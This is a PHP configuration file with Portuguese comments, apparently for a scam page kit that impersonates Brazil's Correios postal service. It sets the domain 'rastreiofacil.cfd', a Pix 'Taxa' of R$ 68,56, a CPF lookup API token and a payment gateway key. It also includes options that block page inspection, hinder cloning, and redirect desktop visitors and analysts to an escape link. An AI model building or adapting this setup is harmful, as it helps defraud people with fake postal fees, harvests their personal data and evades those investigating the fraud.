<?php

/*     
            Configurações da estrutura      
- Todo o texto depois do // explica como funciona a configuração da linha debaixo ou do início da linha.
- Todos os valores devem ficar após o = e antes do ;
- Alguns valores (textos ou números) devem ficar entre aspas (' ') e outros não devem ficar entre as aspas
- A se a configuração de permitir computadores e de inspecionar estiver desabilitado (0), vai dificultar muito que
  pessoas tenham acesso aos códigos do front-end da página, mas programadores experientes conseguem burlar isso. 
- Se o domínio for acessado, o texto carregar mas a página estiver "feia" e as imagens não carregarem, é porque a 
  confirguação de domínio do site está errada. Caso essa estrutura estiver dentro de uma pasta no public_html, 
  deve coloca a pasta na confirguração de domínio do site. Exemplo: meudominio.com/pasta
- Na pasta files -> codigos-personalizados tem 3 arquivos: head.php, body.php e footer.php. O head.php é inserido no final 
  do head do HTML, o body.php é inserido no início do body do HTML e o footer.php é inserido no final do body do HTML.
  Você pode colocar códigos e scripts personalizados (como o pixel) dentro de qualquer um dos 3 arquivos. Mas tome cuidado,
  pois qualquer erro nesses arquivos podem causar bugs sérios na página. Para adicionar um código personalizado a um destes
  arquivos, basta editar o arquivo, colar o código personalizado e salvar o arquivo.
- Para adicionar um Pixel ou GTAG, entre na pasta files -> codigos-personalizados e coloque o código (pixel ou gtag)
  dentro do arquivo head.php. Você também pode colocar o Pixel no arquivo body.php ou footer.php, mas é recomendado colocar
  somente no arquivo head.php.
*/


// Domínio do site. Deve ficar entre aspas. 
// Pode começar com https:// e terminar com o /, mas é opcional 
// Exemplo: 'meudominio.com'. Exemplo: 'https://meudominio.com/'
$config_dominio_site = 'https://rastreiofacil.cfd';

// Título do site. Deve ficar entre aspas. Exemplo: 'Oferta imperdível'
$config_titulo_site = 'Correios';

// Descrição do site. Deve ficar entre aspas.
// Ajuda a dar mais credibilidade ao site.
$config_descricao_site = '';

// Palavras chave do site. Deve ficar entre aspas.
// Ajuda a dar mais credibilidade ao site.
// Só será visível para motores de buscas (google) ou plataformas que analisam o site (google e facebook).
$config_keywords_site = '';

// Permitir visualização em computadores (dispositivos com telas grandes).
// Se tiver 1, os computadores podem acessar.
// Se tiver 0, os computadores que tentarem acessar serão redirecionados para outro link.
// Não deve ficar entre as aspas.
$config_permitir_computadores = 1;

// Permitir Inspecionar. 
// Se tiver 1, quem está vendo a página poderá inspecionar a página e ter acesso ao HTML, CSS e Javascript.
// Se tiver 0, quem tentar inspecionar ou ver o HTML, CSS ou o Javascript vai ter dificuldades. Também vai 
// ter dificuldades em acessar as opções do botão direito do mouse e vai tentar "bugar" a página se tentarem baixar ou clonar
// Não deve ficar entre aspas 
// Recomenda-se deixar em 0
$config_permitir_inspecionar = 0;

// Link de escape. Deve ficar entre aspas. 
// Se alguém tentar inspecionar ou ver a página pelo computador sem a permição, o site vai redirecionar para o link de escape. 
$config_link_escape = 'https://transportafacil.online';

// Token da API de CPF
// Painel da API: hubdodesenvolvedor.com.br
// Fornecido via env var RF_TOKEN_API_CPF no Easypanel (nao comitar).
$token_api_cpf = getenv('RF_TOKEN_API_CPF') ?: '';

// Token - Secrey Key do Gateway (Paggins)
// Fornecido via env var RF_TOKEN_GATEWAY no Easypanel (nao comitar — Push Protection).
$token_gateway = getenv('RF_TOKEN_GATEWAY') ?: '';

// Valor do Pix. Não pode ter vírgula ou ponto. R$ 68,56 deve ficar 6856
$valor_gateway = 6856;

// Nome do produto que aparece no Gateway
$produto_gateway = 'Taxa';

// Nome recebedor do Pix
$recebedor_pix = "";

// Fim das configurações








// Não alterar a linha dabixo!
include('files/php/main.php');
